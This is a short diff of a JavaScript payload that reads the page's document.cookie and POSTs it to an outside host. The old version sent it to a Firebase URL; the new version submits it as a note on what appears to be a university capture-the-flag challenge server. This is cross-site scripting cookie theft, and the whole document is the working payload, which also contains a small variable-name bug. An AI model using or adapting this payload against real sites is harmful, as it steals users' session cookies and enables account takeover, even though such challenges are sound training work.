@@ -1,6 +1,11 @@
-fetch("https://test-43d17.firebaseio.com/cookie.json", {
+var formData = new FormData();
+formData.append('title', 'test');
+formData.append('content', document.cookie);
+formData.append('submit', 'save');
+
+fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new", {
     method: "POST",
-    body: JSON.stringify(document.cookie)
+    body: formData
 }).then(res => {
     alert(response.json);
 });
